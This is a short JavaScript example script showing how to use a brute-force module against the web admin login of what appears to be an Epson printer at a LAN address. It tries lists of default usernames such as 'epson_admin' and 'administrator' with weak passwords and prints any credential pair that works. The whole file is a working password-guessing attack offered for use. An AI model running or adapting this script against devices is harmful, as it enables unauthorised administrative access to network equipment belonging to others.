/* 
Example how to use the brute-forcer
*/
const BruteForcer = require("./BruteForce.js");

// Async IIFE to allow for 'await'
(async () => {
  // Initialize with the LAN IP of the pritner
  const forcer = new BruteForcer("192.168.1.96", {log: true, logPassword: true});

  // Our list of usernames
  const usernames = [
    "admin",
    "Admin",
    "epson_admin",
    "epsonweb",
    "administrator",
    "Administrator",
  ];

  // Possible passwords
  const passwords = [
    "admin",
    "epson_admin",
    "administrator",
    "12345",
    "123456789",
  ];

  // Start cracking provided username/password list
  const found = await forcer.crack(usernames, passwords);

  if (!found) console.log("No matches");
  else console.log(found); // {username: string, password: string}
})();
